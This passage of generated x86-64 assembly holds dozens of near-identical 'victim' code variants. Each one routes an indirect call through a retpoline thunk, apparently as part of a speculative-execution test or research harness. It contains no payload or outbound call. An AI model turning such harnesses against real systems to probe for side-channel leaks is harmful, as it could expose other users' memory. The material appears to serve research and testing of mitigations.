	pause
	lfence
	jmp	.Lgg_retpol_cap_000626
.Lgg_retpol_setup_000626:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000626:
	jmp	.Lvictim_win0_continue
## Variant 627
.Lvictim_win0_var627:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000627
	jmp	.Lgg_retpol_after_000627
.Lgg_retpol_thunk_000627:
	callq	.Lgg_retpol_setup_000627
.Lgg_retpol_cap_000627:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000627
.Lgg_retpol_setup_000627:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000627:
	jmp	.Lvictim_win0_continue
## Variant 628
.Lvictim_win0_var628:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000628
	jmp	.Lgg_retpol_after_000628
.Lgg_retpol_thunk_000628:
	callq	.Lgg_retpol_setup_000628
.Lgg_retpol_cap_000628:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000628
.Lgg_retpol_setup_000628:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000628:
	jmp	.Lvictim_win0_continue
## Variant 629
.Lvictim_win0_var629:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000629
	jmp	.Lgg_retpol_after_000629
.Lgg_retpol_thunk_000629:
	callq	.Lgg_retpol_setup_000629
.Lgg_retpol_cap_000629:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000629
.Lgg_retpol_setup_000629:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000629:
	jmp	.Lvictim_win0_continue
## Variant 630
.Lvictim_win0_var630:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000630
	jmp	.Lgg_retpol_after_000630
.Lgg_retpol_thunk_000630:
	callq	.Lgg_retpol_setup_000630
.Lgg_retpol_cap_000630:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000630
.Lgg_retpol_setup_000630:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000630:
	jmp	.Lvictim_win0_continue
## Variant 631
.Lvictim_win0_var631:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000631
	jmp	.Lgg_retpol_after_000631
.Lgg_retpol_thunk_000631:
	callq	.Lgg_retpol_setup_000631
.Lgg_retpol_cap_000631:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000631
.Lgg_retpol_setup_000631:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000631:
	jmp	.Lvictim_win0_continue
## Variant 632
.Lvictim_win0_var632:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000632
	jmp	.Lgg_retpol_after_000632
.Lgg_retpol_thunk_000632:
	callq	.Lgg_retpol_setup_000632
.Lgg_retpol_cap_000632:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000632
.Lgg_retpol_setup_000632:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000632:
	jmp	.Lvictim_win0_continue
## Variant 633
.Lvictim_win0_var633:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000633
	jmp	.Lgg_retpol_after_000633
.Lgg_retpol_thunk_000633:
	callq	.Lgg_retpol_setup_000633
.Lgg_retpol_cap_000633:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000633
.Lgg_retpol_setup_000633:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000633:
	jmp	.Lvictim_win0_continue
## Variant 634
.Lvictim_win0_var634:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000634
	jmp	.Lgg_retpol_after_000634
.Lgg_retpol_thunk_000634:
	callq	.Lgg_retpol_setup_000634
.Lgg_retpol_cap_000634:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000634
.Lgg_retpol_setup_000634:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000634:
	jmp	.Lvictim_win0_continue
## Variant 635
.Lvictim_win0_var635:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000635
	jmp	.Lgg_retpol_after_000635
.Lgg_retpol_thunk_000635:
	callq	.Lgg_retpol_setup_000635
.Lgg_retpol_cap_000635:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000635
.Lgg_retpol_setup_000635:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000635:
	jmp	.Lvictim_win0_continue
## Variant 636
.Lvictim_win0_var636:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000636
	jmp	.Lgg_retpol_after_000636
.Lgg_retpol_thunk_000636:
	callq	.Lgg_retpol_setup_000636
.Lgg_retpol_cap_000636:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000636
.Lgg_retpol_setup_000636:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000636:
	jmp	.Lvictim_win0_continue
## Variant 637
.Lvictim_win0_var637:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000637
	jmp	.Lgg_retpol_after_000637
.Lgg_retpol_thunk_000637:
	callq	.Lgg_retpol_setup_000637
.Lgg_retpol_cap_000637:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000637
.Lgg_retpol_setup_000637:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000637:
	jmp	.Lvictim_win0_continue
## Variant 638
.Lvictim_win0_var638:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000638
	jmp	.Lgg_retpol_after_000638
.Lgg_retpol_thunk_000638:
	callq	.Lgg_retpol_setup_000638
.Lgg_retpol_cap_000638:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000638
.Lgg_retpol_setup_000638:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000638:
	jmp	.Lvictim_win0_continue
## Variant 639
.Lvictim_win0_var639:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000639
	jmp	.Lgg_retpol_after_000639
.Lgg_retpol_thunk_000639:
	callq	.Lgg_retpol_setup_000639
.Lgg_retpol_cap_000639:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000639
.Lgg_retpol_setup_000639:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000639:
	jmp	.Lvictim_win0_continue
## Variant 640
.Lvictim_win0_var640:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000640
	jmp	.Lgg_retpol_after_000640
.Lgg_retpol_thunk_000640:
	callq	.Lgg_retpol_setup_000640
.Lgg_retpol_cap_000640:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000640
.Lgg_retpol_setup_000640:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000640:
	jmp	.Lvictim_win0_continue
## Variant 641
.Lvictim_win0_var641:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000641
	jmp	.Lgg_retpol_after_000641
.Lgg_retpol_thunk_000641:
	callq	.Lgg_retpol_setup_000641
.Lgg_retpol_cap_000641:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000641
.Lgg_retpol_setup_000641:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000641:
	jmp	.Lvictim_win0_continue
## Variant 642
.Lvictim_win0_var642:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000642
	jmp	.Lgg_retpol_after_000642
.Lgg_retpol_thunk_000642:
	callq	.Lgg_retpol_setup_000642
.Lgg_retpol_cap_000642:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000642
.Lgg_retpol_setup_000642:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000642:
	jmp	.Lvictim_win0_continue
## Variant 643
.Lvictim_win0_var643:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000643
	jmp	.Lgg_retpol_after_000643
.Lgg_retpol_thunk_000643:
	callq	.Lgg_retpol_setup_000643
.Lgg_retpol_cap_000643:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000643
.Lgg_retpol_setup_000643:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000643:
	jmp	.Lvictim_win0_continue
## Variant 644
.Lvictim_win0_var644:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000644
	jmp	.Lgg_retpol_after_000644
.Lgg_retpol_thunk_000644:
	callq	.Lgg_retpol_setup_000644
.Lgg_retpol_cap_000644:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000644
.Lgg_retpol_setup_000644:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000644:
	jmp	.Lvictim_win0_continue
## Variant 645
.Lvictim_win0_var645:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000645
	jmp	.Lgg_retpol_after_000645
.Lgg_retpol_thunk_000645:
	callq	.Lgg_retpol_setup_000645
.Lgg_retpol_cap_000645:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000645
.Lgg_retpol_setup_000645:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000645:
	jmp	.Lvictim_win0_continue
## Variant 646
.Lvictim_win0_var646:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000646
	jmp	.Lgg_retpol_after_000646
.Lgg_retpol_thunk_000646:
	callq	.Lgg_retpol_setup_000646
.Lgg_retpol_cap_000646:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000646
.Lgg_retpol_setup_000646:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000646:
	jmp	.Lvictim_win0_continue
## Variant 647
.Lvictim_win0_var647:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000647
	jmp	.Lgg_retpol_after_000647
.Lgg_retpol_thunk_000647:
	callq	.Lgg_retpol_setup_000647
.Lgg_retpol_cap_000647:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000647
.Lgg_retpol_setup_000647:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000647:
	jmp	.Lvictim_win0_continue
## Variant 648
.Lvictim_win0_var648:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000648
	jmp	.Lgg_retpol_after_000648
.Lgg_retpol_thunk_000648:
	callq	.Lgg_retpol_setup_000648
.Lgg_retpol_cap_000648:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000648
.Lgg_retpol_setup_000648:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000648:
	jmp	.Lvictim_win0_continue
## Variant 649
.Lvictim_win0_var649:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000649
	jmp	.Lgg_retpol_after_000649
.Lgg_retpol_thunk_000649:
	callq	.Lgg_retpol_setup_000649
.Lgg_retpol_cap_000649:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000649
.Lgg_retpol_setup_000649:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000649:
	jmp	.Lvictim_win0_continue
## Variant 650
.Lvictim_win0_var650:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000650
	jmp	.Lgg_retpol_after_000650
.Lgg_retpol_thunk_000650:
	callq	.Lgg_retpol_setup_000650
.Lgg_retpol_cap_000650:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000650
.Lgg_retpol_setup_000650:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000650:
	jmp	.Lvictim_win0_continue
## Variant 651
.Lvictim_win0_var651:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000651
	jmp	.Lgg_retpol_after_000651
.Lgg_retpol_thunk_000651:
	callq	.Lgg_retpol_setup_000651
.Lgg_retpol_cap_000651:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000651
.Lgg_retpol_setup_000651:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000651:
	jmp	.Lvictim_win0_continue
## Variant 652
.Lvictim_win0_var652:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000652
	jmp	.Lgg_retpol_after_000652
.Lgg_retpol_thunk_000652:
	callq	.Lgg_retpol_setup_000652
.Lgg_retpol_cap_000652:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000652
.Lgg_retpol_setup_000652:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000652:
	jmp	.Lvictim_win0_continue
## Variant 653
.Lvictim_win0_var653:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000653
	jmp	.Lgg_retpol_after_000653
.Lgg_retpol_thunk_000653:
	callq	.Lgg_retpol_setup_000653
.Lgg_retpol_cap_000653:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000653
.Lgg_retpol_setup_000653:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000653:
	jmp	.Lvictim_win0_continue
## Variant 654
.Lvictim_win0_var654:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000654
	jmp	.Lgg_retpol_after_000654
.Lgg_retpol_thunk_000654:
	callq	.Lgg_retpol_setup_000654
.Lgg_retpol_cap_000654:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000654
.Lgg_retpol_setup_000654:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000654:
	jmp	.Lvictim_win0_continue
## Variant 655
.Lvictim_win0_var655:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000655
	jmp	.Lgg_retpol_after_000655
.Lgg_retpol_thunk_000655:
	callq	.Lgg_retpol_setup_000655
.Lgg_retpol_cap_000655:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000655
.Lgg_retpol_setup_000655:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000655:
	jmp	.Lvictim_win0_continue
## Variant 656
.Lvictim_win0_var656:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000656
	jmp	.Lgg_retpol_after_000656
.Lgg_retpol_thunk_000656:
	callq	.Lgg_retpol_setup_000656
.Lgg_retpol_cap_000656:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000656
.Lgg_retpol_setup_000656:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000656:
	jmp	.Lvictim_win0_continue
## Variant 657
.Lvictim_win0_var657:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000657
	jmp	.Lgg_retpol_after_000657
.Lgg_retpol_thunk_000657:
	callq	.Lgg_retpol_setup_000657
.Lgg_retpol_cap_000657:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000657
.Lgg_retpol_setup_000657:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000657:
	jmp	.Lvictim_win0_continue
## Variant 658
.Lvictim_win0_var658:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000658
	jmp	.Lgg_retpol_after_000658
.Lgg_retpol_thunk_000658:
	callq	.Lgg_retpol_setup_000658
.Lgg_retpol_cap_000658:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000658
.Lgg_retpol_setup_000658:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000658:
	jmp	.Lvictim_win0_continue
## Variant 659
.Lvictim_win0_var659:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000659
	jmp	.Lgg_retpol_after_000659
.Lgg_retpol_thunk_000659:
	callq	.Lgg_retpol_setup_000659
.Lgg_retpol_cap_000659:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000659
.Lgg_retpol_setup_000659:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000659:
	jmp	.Lvictim_win0_continue
## Variant 660
.Lvictim_win0_var660:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000660
	jmp	.Lgg_retpol_after_000660
.Lgg_retpol_thunk_000660:
	callq	.Lgg_retpol_setup_000660
.Lgg_retpol_cap_000660:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000660
.Lgg_retpol_setup_000660:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000660:
	jmp	.Lvictim_win0_continue
## Variant 661
.Lvictim_win0_var661:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000661
	jmp	.Lgg_retpol_after_000661
.Lgg_retpol_thunk_000661:
	callq	.Lgg_retpol_setup_000661
.Lgg_retpol_cap_000661:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000661
.Lgg_retpol_setup_000661:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000661:
	jmp	.Lvictim_win0_continue
## Variant 662
.Lvictim_win0_var662:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000662
	jmp	.Lgg_retpol_after_000662
.Lgg_retpol_thunk_000662:
	callq	.Lgg_retpol_setup_000662
.Lgg_retpol_cap_000662:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000662
.Lgg_retpol_setup_000662:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000662:
	jmp	.Lvictim_win0_continue
## Variant 663
.Lvictim_win0_var663:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000663
	jmp	.Lgg_retpol_after_000663
.Lgg_retpol_thunk_000663:
	callq	.Lgg_retpol_setup_000663
.Lgg_retpol_cap_000663:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000663
.Lgg_retpol_setup_000663:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000663:
	jmp	.Lvictim_win0_continue
## Variant 664
.Lvictim_win0_var664:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000664
	jmp	.Lgg_retpol_after_000664
.Lgg_retpol_thunk_000664:
	callq	.Lgg_retpol_setup_000664
.Lgg_retpol_cap_000664:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000664
.Lgg_retpol_setup_000664:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000664:
	jmp	.Lvictim_win0_continue
## Variant 665
.Lvictim_win0_var665:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000665
	jmp	.Lgg_retpol_after_000665
.Lgg_retpol_thunk_000665:
	callq	.Lgg_retpol_setup_000665
.Lgg_retpol_cap_000665:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000665
.Lgg_retpol_setup_000665:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000665:
	jmp	.Lvictim_win0_continue
## Variant 666
.Lvictim_win0_var666:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000666
	jmp	.Lgg_retpol_after_000666
.Lgg_retpol_thunk_000666:
	callq	.Lgg_retpol_setup_000666
.Lgg_retpol_cap_000666:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000666
.Lgg_retpol_setup_000666:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000666:
	jmp	.Lvictim_win0_continue
## Variant 667
.Lvictim_win0_var667:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000667
	jmp	.Lgg_retpol_after_000667
.Lgg_retpol_thunk_000667:
	callq	.Lgg_retpol_setup_000667
.Lgg_retpol_cap_000667:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000667
.Lgg_retpol_setup_000667:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000667:
	jmp	.Lvictim_win0_continue
## Variant 668
.Lvictim_win0_var668:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000668
	jmp	.Lgg_retpol_after_000668
.Lgg_retpol_thunk_000668:
	callq	.Lgg_retpol_setup_000668
.Lgg_retpol_cap_000668:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000668
.Lgg_retpol_setup_000668:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000668:
	jmp	.Lvictim_win0_continue
## Variant 669
.Lvictim_win0_var669:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000669
	jmp	.Lgg_retpol_after_000669
.Lgg_retpol_thunk_000669:
	callq	.Lgg_retpol_setup_000669
.Lgg_retpol_cap_000669:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000669
.Lgg_retpol_setup_000669:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000669:
	jmp	.Lvictim_win0_continue
## Variant 670
.Lvictim_win0_var670:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000670
	jmp	.Lgg_retpol_after_000670
.Lgg_retpol_thunk_000670:
	callq	.Lgg_retpol_setup_000670
.Lgg_retpol_cap_000670:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000670
.Lgg_retpol_setup_000670:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000670:
	jmp	.Lvictim_win0_continue
## Variant 671
.Lvictim_win0_var671:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000671
	jmp	.Lgg_retpol_after_000671
.Lgg_retpol_thunk_000671:
	callq	.Lgg_retpol_setup_000671
.Lgg_retpol_cap_000671:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000671
.Lgg_retpol_setup_000671:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000671:
	jmp	.Lvictim_win0_continue
## Variant 672
.Lvictim_win0_var672:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000672
	jmp	.Lgg_retpol_after_000672
.Lgg_retpol_thunk_000672:
	callq	.Lgg_retpol_setup_000672
.Lgg_retpol_cap_000672:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000672
.Lgg_retpol_setup_000672:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000672:
	jmp	.Lvictim_win0_continue
## Variant 673
.Lvictim_win0_var673:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000673
	jmp	.Lgg_retpol_after_000673
.Lgg_retpol_thunk_000673:
	callq	.Lgg_retpol_setup_000673
.Lgg_retpol_cap_000673:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000673
.Lgg_retpol_setup_000673:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000673:
	jmp	.Lvictim_win0_continue
## Variant 674
.Lvictim_win0_var674:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000674
	jmp	.Lgg_retpol_after_000674
.Lgg_retpol_thunk_000674:
	callq	.Lgg_retpol_setup_000674
.Lgg_retpol_cap_000674:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000674
.Lgg_retpol_setup_000674:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000674:
	jmp	.Lvictim_win0_continue
## Variant 675
.Lvictim_win0_var675:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000675
	jmp	.Lgg_retpol_after_000675
.Lgg_retpol_thunk_000675:
	callq	.Lgg_retpol_setup_000675
.Lgg_retpol_cap_000675:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000675
.Lgg_retpol_setup_000675:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000675:
	jmp	.Lvictim_win0_continue
## Variant 676
.Lvictim_win0_var676:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000676
	jmp	.Lgg_retpol_after_000676
.Lgg_retpol_thunk_000676:
	callq	.Lgg_retpol_setup_000676
.Lgg_retpol_cap_000676:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000676
.Lgg_retpol_setup_000676:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000676:
	jmp	.Lvictim_win0_continue
## Variant 677
.Lvictim_win0_var677:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000677
	jmp	.Lgg_retpol_after_000677
.Lgg_retpol_thunk_000677:
	callq	.Lgg_retpol_setup_000677
.Lgg_retpol_cap_000677:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000677
.Lgg_retpol_setup_000677:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000677:
	jmp	.Lvictim_win0_continue
## Variant 678
.Lvictim_win0_var678:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000678
	jmp	.Lgg_retpol_after_000678
.Lgg_retpol_thunk_000678:
	callq	.Lgg_retpol_setup_000678
.Lgg_retpol_cap_000678:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000678
.Lgg_retpol_setup_000678:
	movq	%rbx, (%rsp)
	ret
